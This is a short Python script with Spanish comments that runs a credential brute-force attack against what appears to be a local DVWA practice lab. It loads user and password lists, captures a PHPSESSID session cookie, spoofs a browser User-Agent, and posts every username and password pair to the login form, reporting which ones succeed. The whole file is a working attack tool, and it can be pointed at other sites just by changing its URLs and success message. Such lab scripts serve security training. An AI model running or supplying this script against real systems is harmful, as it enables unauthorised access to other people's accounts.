import requests

url_login = 'http://localhost:8080/login.php'
url_brute = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Función para leer las líneas de un archivo
def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Obtener PHPSESSID de manera dinámica
def get_phpsessid():
    session = requests.Session()  # Crear una sesión para manejar cookies
    response = session.get(url_login)  # Hacer la solicitud inicial
    cookies = session.cookies.get_dict()  # Obtener las cookies en forma de diccionario
    phpsessid = cookies.get('PHPSESSID', None)  # Extraer PHPSESSID
    if phpsessid:
        print(f'PHPSESSID obtenido: {phpsessid}')
        return session, phpsessid  # Devolver la sesión con las cookies y el PHPSESSID
    else:
        print('No se pudo obtener PHPSESSID.')
        return None, None

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(session, phpsessid):
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)
    
    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            # Usar la sesión para realizar la solicitud POST
            response = session.post(url_brute, headers=headers, data=data)

            # Verificar el contenido de la página para encontrar el mensaje correcto
            if 'Welcome to the password protected area' in response.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
            else:
                print(f'[FAILED] Usuario: {username} Contraseña: {password}')

# Ejecutar el ataque de fuerza bruta
session, phpsessid = get_phpsessid()  # Obtener PHPSESSID dinámicamente
if session and phpsessid:
    brute_force_attack(session, phpsessid)
